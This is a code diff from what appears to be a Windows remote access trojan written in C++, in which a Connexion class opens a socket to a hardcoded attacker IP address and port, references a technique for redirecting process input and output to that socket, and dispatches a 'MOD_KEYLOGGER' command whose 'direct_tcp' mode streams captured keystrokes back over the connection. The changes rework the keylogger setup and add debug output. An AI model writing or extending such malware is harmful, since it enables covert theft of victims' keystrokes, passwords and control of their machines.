@@ -27,8 +27,8 @@ INT Connexion::openConnexion()
 
     WSAStartup(MAKEWORD(2,0), &WSAData);
     
-    sock_client =  WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);  //https://stackoverflow.com/questions/4993119/redirect-io-of-process-to-windows-socket
-
+    sock_client =  WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, WSA_FLAG_OVERLAPPED);  //https://stackoverflow.com/questions/4993119/redirect-io-of-process-to-windows-socket
+        
     address_client.sin_addr.s_addr= inet_addr(IP_ADDRESS);
     address_client.sin_family = AF_INET;
     address_client.sin_port = htons(PORT);
@@ -171,15 +171,21 @@ INT Connexion::main()
 
             else if(command.substr(0,14) == L"MOD_KEYLOGGER:")
             {
+
                 wcout << "mod keylogger \n\n" << endl;
-                Keylogger keylogger(sock_client);
-                
+                wcout << "Socket address: " << &sock_client << endl;
+                wcout << "Value: " << sock_client << endl;
+
+                Keylogger keylogger;
+                keylogger.setup();
+                keylogger.setSocket(sock_client);
                 
                 if(command.substr(14, 10) == L"direct_tcp")
                 {
                     wcout << "direct_tp !!!!!!!\n" << endl;
-                    HANDLE thread_to_finish = keylogger.startThread(); //start directTcp()
-                    keylogger.waitingEndSession(thread_to_finish);                     
+                    int stat = send(sock_client, (char *)L"hello2", sizeof(L"hello2"), 0);
+                    //wcout << "stat2: " << stat << endl;
+                    keylogger.directTcp();
                 } 
             }
             
